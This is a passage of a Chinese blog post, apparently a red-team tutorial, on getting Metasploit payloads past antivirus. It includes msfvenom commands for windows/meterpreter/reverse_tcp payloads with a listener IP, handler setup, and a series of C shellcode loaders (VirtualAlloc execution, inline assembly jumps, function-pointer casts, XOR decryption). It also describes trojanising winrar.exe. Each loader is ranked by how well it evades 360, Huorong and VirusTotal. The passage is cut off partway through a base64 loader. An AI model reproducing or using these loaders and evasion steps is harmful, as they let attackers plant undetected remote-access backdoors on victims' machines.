alt=\"image-20220527185214043\"></p>\n<p>全程自动化生成，最终的生成文件会替换原来的<code>winrar.exe</code>。</p>\n<p>通过对比可发现程序稍微变大了</p>\n<p>在msf中使用<code>handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</code>进行监听</p>\n<p>360和火绒均可查杀（原po执行360和火绒均可免杀，msf正常上线）。</p>\n<p>在virustotal.com上查杀率为12&#x2F;65，Bypass了卡巴、瑞星（原po为7&#x2F;69，卡巴、瑞星、微软三个都没bypass）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205271854112.png\" alt=\"image-20220527185452045\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205271856578.png\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205271902073.png\" alt=\"image-20220527190242985\"></p>\n<h2 id=\"C、C-加载shellcode\"><a href=\"#C、C-加载shellcode\" class=\"headerlink\" title=\"C、C++加载shellcode\"></a>C、C++加载shellcode</h2><p>以上很多方法都是使用msfvenom生成shellcode，然后对shellcode进行混淆、编码等各种处理，最终再使用各种语言进行编译或加载。而被用到的最多的语言就是C&#x2F;C++、C#和python。</p>\n<p>C&#x2F;C++加载shellcode手工编译的方法，一般分为两种方式：</p>\n<ol>\n<li><p>C&#x2F;C++源码+shellcode直接编译，其中对shellcode的执行可以使用函数指针执行、汇编指令执行、申请动态内存等方式，且shellcode可进行一些加密混淆处理；比如免杀工具veil和Venom都是使用了类似的方法。</p>\n</li>\n<li><p>使用加载器加载C&#x2F;C++代码，如shellcode_launcher之类。</p>\n</li>\n</ol>\n<h3 id=\"方法1-msf直接生成exe（VT免杀率51-69）\"><a href=\"#方法1-msf直接生成exe（VT免杀率51-69）\" class=\"headerlink\" title=\"方法1 msf直接生成exe（VT免杀率51&#x2F;69）\"></a>方法1 msf直接生成exe（VT免杀率51&#x2F;69）</h3><p>这是最简单的一种加载shellcode的方法，直接使用msfvenom生成c语言的shellcode，为了提高免杀效果，使用了<code>shikata_ga_nai</code>编码器。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\\x00&#x27; lhost=192.168.174.128 lport=6666  -f exe -o shellcode1.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./images/202205301154200.png\" alt=\"image-20220530115440059\"></p>\n<p>在msf中进行监听：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf6 &gt; use multi/handler</span><br><span class=\"line\">msf6 &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">msf6 &gt; set LHOST 192.168.174.128</span><br><span class=\"line\">msf6 &gt; set LPORT 6666</span><br><span class=\"line\">msf6 &gt; set EnableStageEncoding true</span><br></pre></td></tr></table></figure>\n\n<p>然后执行生成的<code>shellcode1.exe</code>，msf中可正常上线：</p>\n<p><img src=\"/./images/202205301154538.png\" alt=\"image-20220530115427316\"></p>\n<p>360和火绒均可查杀，在virustotal.com上查杀率为51&#x2F;69。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205301155110.png\" alt=\"image-20220530115531047\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205301156409.png\" alt=\"image-20220530115635342\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301157438.png\" alt=\"image-20220530115749310\"></p>\n<h3 id=\"方法2-申请动态内存加载（VT免杀率36-69）\"><a href=\"#方法2-申请动态内存加载（VT免杀率36-69）\" class=\"headerlink\" title=\"方法2 申请动态内存加载（VT免杀率36&#x2F;69）\"></a>方法2 申请动态内存加载（VT免杀率36&#x2F;69）</h3><p>下面的代码会申请一段动态内存，然后加载shellcode。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker,<span class=\"string\">&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;</span>) <span class=\"comment\">//windows控制台程序不出黑窗口</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] =</span><br><span class=\"line\"><span class=\"string\">&quot;shellcode&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 原po此处内存报错，已修改</span></span><br><span class=\"line\">    LPVOID Memory;</span><br><span class=\"line\"></span><br><span class=\"line\">    Memory=VirtualAlloc(<span class=\"literal\">NULL</span>, <span class=\"keyword\">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(Memory, shellcode, <span class=\"keyword\">sizeof</span>(shellcode));</span><br><span class=\"line\"></span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())Memory)();</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>visual studio 2019进行编译，关闭杀软，msf中可正常上线：</p>\n<p><img src=\"/./images/202205301349630.png\" alt=\"image-20220530134959565\"></p>\n<p>打开杀软，360和火绒均可查杀（原po火绒静态和动态都可查杀，360杀毒和卫士没有反应）。</p>\n<p>virustotal.com上查杀率为36&#x2F;69（原po为24&#x2F;71）。</p>\n<p>受控机没有C环境，执行时缺少<code>VCRUNTIME140D.dll</code>和<code>ucrtbased.dll</code>，需要手动安装。</p>\n<p><img src=\"/./images/202205301354403.png\" alt=\"image-20220530135423356\"></p>\n<p>360：</p>\n<p><img src=\"/./images/202205301355884.png\" alt=\"image-20220530135541816\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205301352552.png\" alt=\"image-20220530135217482\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301400718.png\" alt=\"image-20220530140029621\"></p>\n<h3 id=\"方法3-嵌入汇编加载（VT免杀率36-69）\"><a href=\"#方法3-嵌入汇编加载（VT免杀率36-69）\" class=\"headerlink\" title=\"方法3 嵌入汇编加载（VT免杀率36&#x2F;69）\"></a>方法3 嵌入汇编加载（VT免杀率36&#x2F;69）</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] =<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        mov eax, offset shellcode</span><br><span class=\"line\">        jmp eax</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在vs2019中编译执行，关闭杀软，msf中可正常上线。</p>\n<p>打开杀软，火绒和360均可查杀（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>\n<p>virustotal.com上查杀率为36&#x2F;69（原po为12&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205301413445.png\" alt=\"image-20220530141332388\"></p>\n<p>火绒：</p>\n<p><img src=\"/./images/202205301414456.png\" alt=\"image-20220530141410368\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301417844.png\" alt=\"image-20220530141716720\"></p>\n<h3 id=\"方法4-强制类型转换（VT免杀率34-68）\"><a href=\"#方法4-强制类型转换（VT免杀率34-68）\" class=\"headerlink\" title=\"方法4 强制类型转换（VT免杀率34&#x2F;68）\"></a>方法4 强制类型转换（VT免杀率34&#x2F;68）</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char shellcode[] =&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   ((void(WINAPI*)(void))&amp;shellcode)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打开杀软测试，360和火绒均可查杀，但360是在上线后几分钟后才检测出来的（原po静态+动态都没问题，可正常上线）。</p>\n<p>virustotal.com上查杀率为34&#x2F;68（原po为9&#x2F;70）。</p>\n<p><img src=\"/./images/202205301425472.png\" alt=\"image-20220530142524357\"></p>\n<h3 id=\"方法5-汇编花指令-VT免杀率37-69\"><a href=\"#方法5-汇编花指令-VT免杀率37-69\" class=\"headerlink\" title=\"方法5 汇编花指令(VT免杀率37&#x2F;69)\"></a>方法5 汇编花指令(VT免杀率37&#x2F;69)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> comment(linker, <span class=\"string\">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> shellcode[] =<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        mov eax, offset shellcode</span><br><span class=\"line\">        _emit <span class=\"number\">0xFF</span>  </span><br><span class=\"line\">        _emit <span class=\"number\">0xE0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打开杀软，火绒可查杀，<strong>360不可查杀</strong>（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>\n<p>virustotal.com上查杀率为37&#x2F;69（原po为12&#x2F;69）。</p>\n<p><img src=\"/./images/202205301430315.png\" alt=\"image-20220530143025208\"></p>\n<h3 id=\"方法6-xor加密（VT免杀率21-69）\"><a href=\"#方法6-xor加密（VT免杀率21-69）\" class=\"headerlink\" title=\"方法6 xor加密（VT免杀率21&#x2F;69）\"></a>方法6 xor加密（VT免杀率21&#x2F;69）</h3><p>需要使用一个工具<code>https://github.com/Arno0x/ShellcodeWrapper</code>，原项目为python2，在此基础上修改了一个python3版本<a href=\"https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper\">ShellcodeWrapper</a>。</p>\n<p>先用msfvenom生成一个raw格式的shellcode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\\x00&#x27; lhost=192.168.174.128 lport=6666  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure>\n\n<p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>threekiii</code>为自己设置的key。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python shellcode_encoder.py -cpp -cs -py shellcode.raw threekiii xor</span><br></pre></td></tr></table></figure>\n\n<p>生成了三个文件，一个为C++源码，也是下面要用到的，一个为C#源码，可以使用csc.exe进行加载，还有一个py文件，可直接执行也可以编译成py-exe执行。</p>\n<p><img src=\"/./images/202205301450337.png\" alt=\"image-20220530145037208\"></p>\n<p>其中<code>encryptedShellcodeWrapper_xor.cpp</code>文件中的C++源码如下，稍作修改，删除依赖库：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Author: Arno0x0x, Twitter: @Arno0x0x</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 删除#include &quot;stdafx.h&quot;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Encrypted shellcode and cipher key obtained from shellcode_encoder.py</span></span><br><span class=\"line\">    <span class=\"type\">char</span> encryptedShellcode[] = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> key[] = <span class=\"string\">&quot;tidesec&quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> cipherType[] = <span class=\"string\">&quot;xor&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Char array to host the deciphered shellcode</span></span><br><span class=\"line\">    <span class=\"type\">char</span> shellcode[<span class=\"keyword\">sizeof</span> encryptedShellcode];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// XOR decoding stub using the key defined above must be the same as the encoding key</span></span><br><span class=\"line\">    <span class=\"type\">int</span> j = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (j == <span class=\"keyword\">sizeof</span> key - <span class=\"number\">1</span>) j = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class=\"line\">        j++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Allocating memory with EXECUTE writes</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *exec = VirtualAlloc(<span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Copying deciphered shellcode into memory as a function</span></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(exec, shellcode, <span class=\"keyword\">sizeof</span> shellcode);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Call the shellcode</span></span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())exec)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>vs2019编译执行，关闭杀软，msf中可正常上线：</p>\n<p><img src=\"/./images/202205301453694.png\" alt=\"image-20220530145307544\"></p>\n<p>打开杀软，360和火绒均可查杀，其中360结果为“具有木马特征程序”（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>\n<p>virustotal.com上查杀率为21&#x2F;69（原po为15&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205301454631.png\" alt=\"image-20220530145415574\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301456618.png\" alt=\"image-20220530145657512\"></p>\n<h3 id=\"方法7-base64加密1（VT免杀率21-68）\"><a href=\"#方法7-base64加密1（VT免杀率21-68）\" class=\"headerlink\" title=\"方法7 base64加密1（VT免杀率21&#x2F;68）\"></a>方法7 base64加密1（VT免杀率21&#x2F;68）</h3><p>需要两个文件，<code>base64.c</code>和<code>base64.h</code></p>\n<p><code>base64.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Base64 encoder/decoder. Originally Apache file ap_base64.c</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* aaaack but it&#x27;s fast and const should make it shared text page. */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> pr2six[<span class=\"number\">256</span>] =</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ASCII table */</span></span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">62</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">63</span>,</span><br><span class=\"line\">    <span class=\"number\">52</span>, <span class=\"number\">53</span>, <span class=\"number\">54</span>, <span class=\"number\">55</span>, <span class=\"number\">56</span>, <span class=\"number\">57</span>, <span class=\"number\">58</span>, <span class=\"number\">59</span>, <span class=\"number\">60</span>, <span class=\"number\">61</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>,  <span class=\"number\">0</span>,  <span class=\"number\">1</span>,  <span class=\"number\">2</span>,  <span class=\"number\">3</span>,  <span class=\"number\">4</span>,  <span class=\"number\">5</span>,  <span class=\"number\">6</span>,  <span class=\"number\">7</span>,  <span class=\"number\">8</span>,  <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>,</span><br><span class=\"line\">    <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">21</span>, <span class=\"number\">22</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>, <span class=\"number\">25</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">26</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">29</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">32</span>, <span class=\"number\">33</span>, <span class=\"number\">34</span>, <span class=\"number\">35</span>, <span class=\"number\">36</span>, <span class=\"number\">37</span>, <span class=\"number\">38</span>, <span class=\"number\">39</span>, <span class=\"number\">40</span>,</span><br><span class=\"line\">    <span class=\"number\">41</span>, <span class=\"number\">42</span>, <span class=\"number\">43</span>, <span class=\"number\">44</span>, <span class=\"number\">45</span>, <span class=\"number\">46</span>, <span class=\"number\">47</span>, <span class=\"number\">48</span>, <span class=\"number\">49</span>, <span class=\"number\">50</span>, <span class=\"number\">51</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span 